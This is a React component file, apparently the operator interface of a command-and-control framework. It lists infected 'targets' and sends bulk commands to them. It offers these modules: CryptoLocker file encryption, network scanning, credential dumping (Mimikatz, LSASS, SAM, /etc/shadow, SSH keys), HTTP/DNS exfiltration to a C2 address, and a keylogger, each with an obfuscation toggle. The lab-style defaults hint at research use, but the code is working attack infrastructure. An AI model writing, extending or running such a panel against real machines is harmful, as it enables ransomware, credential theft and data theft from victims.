import React, { useEffect, useState } from "react";
import { useSelector } from "react-redux";
import { fetchTargets, toggleTargetStatus, sendBulkCommand, sendBulkModuleCommand } from "../../store/slices/targetsSlice";
import { useAppDispatch } from "../../hooks/useAppDispatch";
import { Link } from "react-router-dom";
import type { RootState } from "../../store/store";

const MODULES = [
  { value: "cryptolocker", label: "CryptoLocker" },
  { value: "netscan", label: "Network Scan" },
  { value: "creddump", label: "Credential Dump" },
  { value: "exfil", label: "Exfiltration" },
  { value: "keylogger", label: "Keylogger" },
];

const TargetList: React.FC = () => {
  const dispatch = useAppDispatch();
  const { list, status, error } = useSelector((state: RootState) => state.targets);

  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [bulkTab, setBulkTab] = useState<"raw" | "module">("raw");
  const [bulkCommand, setBulkCommand] = useState("");
  const [bulkObfuscate, setBulkObfuscate] = useState(false);
  const [bulkSending, setBulkSending] = useState(false);
  const [bulkResult, setBulkResult] = useState<string | null>(null);

  // Module form state
  const [moduleName, setModuleName] = useState("netscan");
  const [moduleObfuscate, setModuleObfuscate] = useState(false);
  const [targetDir, setTargetDir] = useState("/tmp/test");
  const [fileExts, setFileExts] = useState(".txt,.pdf");
  const [scanTarget, setScanTarget] = useState("127.0.0.1");
  const [scanPorts, setScanPorts] = useState("22,80,443,8080");
  const [scanTimeout, setScanTimeout] = useState("500");
  const [dumpMethod, setDumpMethod] = useState("all");
  const [mimikatzUrl, setMimikatzUrl] = useState("");
  const [exfilDir, setExfilDir] = useState("/tmp");
  const [exfilExts, setExfilExts] = useState("");
  const [exfilTransport, setExfilTransport] = useState("http");
  const [exfilC2, setExfilC2] = useState("127.0.0.1:8000");
  const [exfilDns, setExfilDns] = useState("exfil.lab.local");
  const [exfilEncryption, setExfilEncryption] = useState("aes");
  const [klDuration, setKlDuration] = useState("60");
  const [klOutputMode, setKlOutputMode] = useState("stdout");

  useEffect(() => {
    dispatch(fetchTargets());
  }, [dispatch]);

  // Clear selection when list changes (e.g. targets disappear)
  useEffect(() => {
    setSelectedIds((prev) => {
      const validIds = new Set(list.map((t) => t.id));
      const next = new Set([...prev].filter((id) => validIds.has(id)));
      return next.size === prev.size ? prev : next;
    });
  }, [list]);

  const activeTargets = list.filter((t) => t.status === "active");
  const allActiveSelected = activeTargets.length > 0 && activeTargets.every((t) => selectedIds.has(t.id));

  const toggleSelect = (id: string) => {
    setSelectedIds((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const toggleSelectAll = () => {
    if (allActiveSelected) {
      setSelectedIds(new Set());
    } else {
      setSelectedIds(new Set(activeTargets.map((t) => t.id)));
    }
  };

  const handleBulkRaw = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!bulkCommand.trim() || selectedIds.size === 0) return;
    setBulkSending(true);
    setBulkResult(null);
    try {
      const result = await dispatch(
        sendBulkCommand({
          command: bulkCommand,
          target_ids: [...selectedIds],
          obfuscate: bulkObfuscate,
        })
      ).unwrap();
      setBulkResult(`Command queued on ${result.length} target(s)`);
      setBulkCommand("");
    } catch (err: any) {
      setBulkResult(`Error: ${err}`);
    }
    setBulkSending(false);
  };

  const handleBulkDelete = async () => {
    if (selectedIds.size === 0) return;

    const confirmDelete = window.confirm(
      `Are you sure you want to PERMANENTLY DELETE ${selectedIds.size} selected target(s)?\n\n` +
      `This will delete:\n` +
      `- All target records\n` +
      `- All command history\n` +
      `- All stored encryption keys\n` +
      `- All exfiltrated data\n\n` +
      `This action CANNOT be undone!`
    );

    if (!confirmDelete) return;

    setBulkSending(true);
    setBulkResult(null);

    let deleted = 0;
    let failed = 0;

    for (const targetId of selectedIds) {
      try {
        const response = await fetch(`/api/v1/targets/${targetId}`, {
          method: 'DELETE',
          headers: {
            'Authorization': `Bearer ${localStorage.getItem('token')}`
          }
        });

        if (response.ok) {
          deleted++;
        } else {
          failed++;
        }
      } catch (error) {
        failed++;
      }
    }

    setBulkResult(`Deletion complete: ${deleted} deleted, ${failed} failed`);
    setBulkSending(false);
    setSelectedIds(new Set());

    // Refresh the targets list
    dispatch(fetchTargets());
  };

  const handleBulkModule = async (e: React.FormEvent) => {
    e.preventDefault();
    if (selectedIds.size === 0) return;
    setBulkSending(true);
    setBulkResult(null);

    let params: Record<string, any> = {};
    if (moduleName === "cryptolocker") {
      params = {
        target_directory: targetDir,
        file_extensions: fileExts.split(",").map((s) => s.trim()).filter(Boolean),
      };
    } else if (moduleName === "netscan") {
      params = {
        scan_target: scanTarget,
        ports: scanPorts.split(",").map((s) => parseInt(s.trim(), 10)).filter((n) => !isNaN(n)),
        timeout_ms: parseInt(scanTimeout, 10) || 500,
      };
    } else if (moduleName === "creddump") {
      params = {
        method: dumpMethod,
        ...(mimikatzUrl ? { mimikatz_url: mimikatzUrl } : {}),
      };
    } else if (moduleName === "exfil") {
      params = {
        target_directory: exfilDir,
        file_extensions: exfilExts.split(",").map((s) => s.trim()).filter(Boolean),
        transport: exfilTransport,
        c2_server: exfilC2,
        dns_domain: exfilDns,
        encryption: exfilEncryption,
      };
    } else if (moduleName === "keylogger") {
      params = {
        duration: parseInt(klDuration, 10) || 60,
        output_mode: klOutputMode,
      };
    }

    try {
      const result = await dispatch(
        sendBulkModuleCommand({
          module_name: moduleName,
          target_ids: [...selectedIds],
          obfuscate: moduleObfuscate,
          params,
        })
      ).unwrap();
      setBulkResult(`Module "${moduleName}" queued on ${result.length} target(s)`);
    } catch (err: any) {
      setBulkResult(`Error: ${err}`);
    }
    setBulkSending(false);
  };

  if (status === "loading") return <p>Loading targets...</p>;
  if (error) return <p className="error">{error}</p>;

  return (
    <div>
      <h2>Targets</h2>
      {list.length === 0 ? (
        <p>No targets connected.</p>
      ) : (
        <>
          <table>
            <thead>
              <tr>
                <th style={{ width: "2rem", textAlign: "center" }}>
                  <input
                    type="checkbox"
                    checked={allActiveSelected}
                    onChange={toggleSelectAll}
                    title="Select all active targets"
                  />
                </th>
                <th>ID</th>
                <th>Hostname</th>
                <th>IP Address</th>
                <th>OS</th>
                <th>Status</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {list.map((target) => (
                <tr key={target.id} style={{ background: selectedIds.has(target.id) ? "rgba(66,165,245,0.1)" : undefined }}>
                  <td style={{ textAlign: "center" }}>
                    <input
                      type="checkbox"
                      checked={selectedIds.has(target.id)}
                      onChange={() => toggleSelect(target.id)}
                      disabled={target.status !== "active"}
                    />
                  </td>
                  <td>{target.id}</td>
                  <td>{target.hostname}</td>
                  <td>{target.ip_address}</td>
                  <td>{target.os || "-"}</td>
                  <td style={{ color: target.status === "active" ? "#66bb6a" : "#ef5350" }}>
                    {target.status}
                  </td>
                  <td style={{ display: "flex", gap: "0.5rem" }}>
                    <Link to={`/targets/${target.id}`}>View</Link>
                    <button
                      className="btn-secondary"
                      onClick={() =>
                        dispatch(
                          toggleTargetStatus({
                            targetId: target.id,
                            newStatus: target.status === "inactive" ? "active" : "inactive",
                          })
                        )
                      }
                      style={{ padding: "0.15rem 0.5rem", fontSize: "0.75rem" }}
                    >
                      {target.status === "inactive" ? "Activate" : "Deactivate"}
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>

          {/* Bulk Command Panel */}
          {selectedIds.size > 0 && (
            <div
              style={{
                marginTop: "1.5rem",
                padding: "1rem",
                border: "1px solid #444",
                borderRadius: "6px",
                background: "rgba(255,255,255,0.03)",
              }}
            >
              <h3 style={{ margin: "0 0 0.75rem 0" }}>
                Bulk Command — {selectedIds.size} target(s) selected
              </h3>

              <div style={{ display: "flex", gap: "0.5rem", marginBottom: "1rem" }}>
                <button
                  className={bulkTab === "raw" ? "" : "btn-secondary"}
                  onClick={() => setBulkTab("raw")}
                  style={{ padding: "0.3rem 0.8rem", fontSize: "0.85rem" }}
                >
                  Raw Command
                </button>
                <button
                  className={bulkTab === "module" ? "" : "btn-secondary"}
                  onClick={() => setBulkTab("module")}
                  style={{ padding: "0.3rem 0.8rem", fontSize: "0.85rem" }}
                >
                  Module
                </button>
                <button
                  onClick={handleBulkDelete}
                  disabled={selectedIds.size === 0 || bulkSending}
                  style={{
                    padding: "0.3rem 0.8rem",
                    fontSize: "0.85rem",
                    backgroundColor: "#f44336",
                    color: "white",
                    border: "1px solid #f44336",
                    marginLeft: "auto"
                  }}
                >
                  {bulkSending ? "Deleting..." : `Delete Selected (${selectedIds.size})`}
                </button>
              </div>

              {bulkTab === "raw" && (
                <form onSubmit={handleBulkRaw} style={{ display: "flex", gap: "0.5rem", alignItems: "center", flexWrap: "wrap" }}>
                  <input
                    type="text"
                    value={bulkCommand}
                    onChange={(e) => setBulkCommand(e.target.value)}
                    placeholder="Enter command..."
                    style={{ flex: 1, minWidth: "200px" }}
                  />
                  <label className="checkbox-label">
                    <input
                      type="checkbox"
                      checked={bulkObfuscate}
                      onChange={(e) => setBulkObfuscate(e.target.checked)}
                    />
                    Obfuscate
                  </label>
                  <button type="submit" disabled={bulkSending}>
                    {bulkSending ? "Sending..." : "Send to All"}
                  </button>
                </form>
              )}

              {bulkTab === "module" && (
                <form onSubmit={handleBulkModule} className="module-form">
                  <div className="form-row">
                    <label>Module</label>
                    <select value={moduleName} onChange={(e) => setModuleName(e.target.value)}>
                      {MODULES.map((m) => (
                        <option key={m.value} value={m.value}>
                          {m.label}
                        </option>
                      ))}
                    </select>
                    <label className="checkbox-label">
                      <input
                        type="checkbox"
                        checked={moduleObfuscate}
                        onChange={(e) => setModuleObfuscate(e.target.checked)}
                      />
                      Obfuscate
                    </label>
                  </div>

                  {moduleName === "cryptolocker" && (
                    <div className="form-row">
                      <label>Target Directory</label>
                      <input type="text" value={targetDir} onChange={(e) => setTargetDir(e.target.value)} />
                      <label>File Extensions (comma-separated)</label>
                      <input type="text" value={fileExts} onChange={(e) => setFileExts(e.target.value)} />
                    </div>
                  )}

                  {moduleName === "netscan" && (
                    <div className="form-row">
                      <label>Scan Target IP</label>
                      <input type="text" value={scanTarget} onChange={(e) => setScanTarget(e.target.value)} />
                      <label>Ports (comma-separated)</label>
                      <input type="text" value={scanPorts} onChange={(e) => setScanPorts(e.target.value)} />
                      <label>Timeout (ms)</label>
                      <input type="text" value={scanTimeout} onChange={(e) => setScanTimeout(e.target.value)} style={{ width: "80px" }} />
                    </div>
                  )}

                  {moduleName === "creddump" && (
                    <div className="form-row">
                      <label>Method</label>
                      <select value={dumpMethod} onChange={(e) => setDumpMethod(e.target.value)}>
                        <option value="all">All</option>
                        <option value="mimikatz">Mimikatz (Win)</option>
                        <option value="sam">SAM Dump (Win)</option>
                        <option value="lsass">LSASS Dump (Win)</option>
                        <option value="shadow">/etc/shadow (Linux)</option>
                        <option value="memory">Proc Memory (Linux)</option>
                        <option value="ssh_keys">SSH Keys (Linux)</option>
                      </select>
                      <label>Mimikatz URL (optional)</label>
                      <input type="text" value={mimikatzUrl} onChange={(e) => setMimikatzUrl(e.target.value)} placeholder="https://host/Invoke-Mimikatz.ps1" />
                    </div>
                  )}

                  {moduleName === "keylogger" && (
                    <div className="form-row">
                      <label>Duration (seconds)</label>
                      <input type="text" value={klDuration} onChange={(e) => setKlDuration(e.target.value)} style={{ width: "80px" }} />
                      <label>Output Mode</label>
                      <select value={klOutputMode} onChange={(e) => setKlOutputMode(e.target.value)}>
                        <option value="stdout">Stdout (via C2)</option>
                        <option value="file">File (on target)</option>
                      </select>
                    </div>
                  )}

                  {moduleName === "exfil" && (
                    <>
                      <div className="form-row">
                        <label>Target Directory</label>
                        <input type="text" value={exfilDir} onChange={(e) => setExfilDir(e.target.value)} />
                        <label>File Extensions (empty = all)</label>
                        <input type="text" value={exfilExts} onChange={(e) => setExfilExts(e.target.value)} placeholder=".txt,.pdf,.docx" />
                      </div>
                      <div className="form-row">
                        <label>Transport</label>
                        <select value={exfilTransport} onChange={(e) => setExfilTransport(e.target.value)}>
                          <option value="http">HTTP</option>
                          <option value="dns">DNS</option>
                        </select>
                        <label>C2 Address</label>
                        <input type="text" value={exfilC2} onChange={(e) => setExfilC2(e.target.value)} />
                        {exfilTransport === "dns" && (
                          <>
                            <label>DNS Domain</label>
                            <input type="text" value={exfilDns} onChange={(e) => setExfilDns(e.target.value)} />
                          </>
                        )}
                      </div>
                      <div className="form-row">
                        <label>Encryption</label>
                        <select value={exfilEncryption} onChange={(e) => setExfilEncryption(e.target.value)}>
                          <option value="none">None (base64 only)</option>
                          <option value="xor">XOR + base64</option>
                        </select>
                      </div>
                    </>
                  )}

                  <button type="submit" disabled={bulkSending}>
                    {bulkSending ? "Sending..." : "Execute on All"}
                  </button>
                </form>
              )}

              {bulkResult && (
                <p style={{ marginTop: "0.75rem", color: bulkResult.startsWith("Error") ? "#ef5350" : "#66bb6a" }}>
                  {bulkResult}
                </p>
              )}
            </div>
          )}
        </>
      )}
    </div>
  );
};

export default TargetList;
